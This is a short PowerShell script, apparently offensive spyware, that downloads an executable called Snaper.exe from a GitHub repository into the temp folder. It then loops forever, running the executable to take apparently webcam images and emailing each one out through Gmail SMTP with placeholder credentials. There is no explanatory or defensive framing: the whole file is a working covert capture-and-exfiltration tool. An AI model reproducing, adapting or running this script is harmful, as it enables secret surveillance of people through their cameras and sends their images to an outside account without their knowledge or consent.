cd $env:tmp
wget -o Snaper.exe "https://github.com/darkuser744/CamSnap/raw/main/Snaper.exe"
del *.bmp
while($true){
$pwd = ConvertTo-SecureString '_password_' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential _gmail_,$pwd
./Snaper.exe
$d=$nr++
%{Rename-Item image.bmp -NewName ('{0}.bmp' -f $d )}
$param = @{
    SmtpServer = 'smtp.gmail.com'
    Port = 587
    UseSsl = $true
    Credential = $cred
    From = '_gmail_'
    To = '_gmail_'
    Subject = 'Message'
    Body = "Message"
    Attachments = "$d.bmp"
    }
sleep 1
Send-MailMessage @param
}